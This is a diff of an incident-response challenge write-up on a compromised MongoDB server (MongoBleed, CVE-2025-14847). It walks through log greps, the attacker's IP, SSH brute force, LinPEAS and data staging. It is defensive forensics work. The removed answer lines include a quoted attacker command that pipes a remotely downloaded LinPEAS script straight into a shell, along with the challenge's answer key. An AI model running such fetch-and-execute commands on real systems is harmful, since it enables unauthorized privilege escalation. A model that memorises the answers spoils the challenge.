@@ -9,13 +9,11 @@ Artifacts:
         - auth.log
         - mongod.log
 
-Q) What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
+1. The MongoDB version should be identified primarily from the mongod.log file, where the service typically logs its startup banner, including version information and build details.This version information is critical for determining whether the system is vulnerable to known exploits such as those associated with “MongoBleed.” Once the version is confirmed, it should be cross-referenced with known CVEs to assess potential exposure and exploitability.
+
 **cat auth.log | grep -i mongodb**
 
 <img width="1920" height="1080" alt="1" src="https://github.com/user-attachments/assets/1b914097-6cbf-4a25-8a50-e78ea7b7216f" />
-
-
-Or you can check version in **mongod.log**
 
 **cat mongod.log | grep -i version**
 
@@ -24,70 +22,44 @@ Or you can check version in **mongod.log**
 
 <img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/f717c118-75df-47ee-ac38-5cca04558192" />
 
-
-**Answer: CVE-2025-14847**
-
-Q) What is the version of MongoDB installed on the server that the CVE exploited?
+2. The identified MongoDB version is is confirmed to be vulnerable to CVE-2025-14847. This vulnerability allows unauthenticated remote clients to access uninitialized heap memory through malformed compressed protocol messages, potentially exposing sensitive in-memory data such as credentials, tokens, and configuration details.
 
 **cat mongod.log | grep -i version**
 
 <img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/8a3db03d-140e-4a04-873e-33c4f4305da4" />
 
-
-**Answer: 8.0.16**
-
-Q) Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.
+3. The mongod.log file can be analyzed to identify connection lifecycle events, including when client connections are established and terminated.
 
 **cat mongod.log | grep -i ended | less**
 
 <img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/71af0bec-634d-4026-8fa9-b7148652dc3f" />
 
-
-**Answer: 65.0.76.43**
-
-Q) Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
+4. Analysis of the mongod.log file reveals multiple “connection ended” events associated with the external IP address 65.0.76.43. The repeated presence of this IP in connection lifecycle logs indicates active interaction with the MongoDB service start at 2025-12-29 05:25:52.
 
 **cat mongod.log | grep -i ended | less**
 
 <img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/2c64c5b4-8016-4623-b7b2-f3423efaa877" />
 
-
-**Answer: 2025-12-29 05:25:52**
-
-Q) Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
-
-**cat mongod.log | tail -n 300**
-
-<img width="1920" height="1080" alt="5" src="https://github.com/user-attachments/assets/ebb8bd0a-51ed-4627-9378-810bf0605bb4" />
-
-
-I added the connectionId of "Connection ended" to connectionId of "Connection accepted"  (37630+37630=75260) and that was the answer.
-
-**Answer: 75260**
-
-Q) The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
+5. Analysis of the authentication logs indicates that the attacker successfully gained remote access to the server after a series of SSH brute-force attempts targeting the mongoadmin account. Following multiple failed authentication attempts, a successful SSH session was established on 2025-12-29 05:40:03 from the external IP address 65.0.76.43.
 
 **cat auth.log | grep -i mongo**
 
 <img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/5a66d48d-b447-4b82-b6d5-de51d6bf6e58" />
 
-
-**Answer: 2025-12-29 05:40:03**
-
-Q) Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
+6. Following the successful SSH login, the attacker executed LinPEAS, a Linux privilege escalation enumeration tool commonly used during post-exploitation.
 
 **cat mangoadmin/.bash_history**
 
 <img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/0b39c1c5-47f7-4dea-b641-f3c7988b8c72" />
 
-
-**Answer: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh**
-
-Q) The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
+7. Following system reconnaissance, the attacker used the zip utility to compress a directory named mongodb, likely to prepare its contents for transfer. Shortly afterward, the attacker started a Python HTTP server, which is commonly used to facilitate file transfer during post-exploitation.
 
 **cat mangoadmin/.bash_history**
 
 <img width="1920" height="1080" alt="8" src="https://github.com/user-attachments/assets/b2f2bf74-e364-429d-9693-066eaacd942e" />
 
+Conclusion:
 
-**Answer: /var/lib/mongodb**
+The triage investigation confirms that the mongodbsync server was compromised through a successful SSH brute-force attack against the mongoadmin account. Authentication logs show that, after multiple failed login attempts, the attacker established an SSH session from the external IP address 65.0.76.43 on 2025-12-29 05:40:03, providing interactive access to the system.
+Analysis also identified that the server was running MongoDB 8.0.16, a version affected by CVE-2025-14847 (MongoBleed). While this vulnerability represents a significant security risk, the available evidence confirms that the attacker's initial access was achieved through a successful SSH login rather than proving exploitation of the MongoDB vulnerability.
+After gaining access, the attacker executed LinPEAS, indicating active post-exploitation reconnaissance to identify privilege escalation opportunities and gather detailed information about the system. The attacker then compressed the mongodb directory using the zip utility, demonstrating data staging activity. Finally, a Python HTTP server was started, strongly suggesting an attempt to transfer the archived data from the compromised host. This behavior is consistent with preparation for data exfiltration and should be correlated with network logs to determine whether the archive was successfully downloaded.
